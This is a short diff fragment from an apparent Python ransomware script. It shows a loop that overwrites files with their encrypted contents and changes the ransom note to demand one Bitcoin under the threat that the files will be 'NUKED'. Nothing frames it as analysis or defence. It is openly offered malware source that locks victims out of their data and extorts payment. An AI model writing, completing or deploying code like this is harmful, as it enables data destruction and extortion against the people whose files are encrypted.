@@ -37,4 +37,4 @@ for file in files:
     with open(file, "wb") as files:
         files.write(contents_encrypted)
 
-print("All of your files have been encrypted!! Send 1 Bitcoin or say goodbye to your files!")
+print("All of your files have been encrypted!! Send 1 Bitcoin or your files will be NUKED!!")
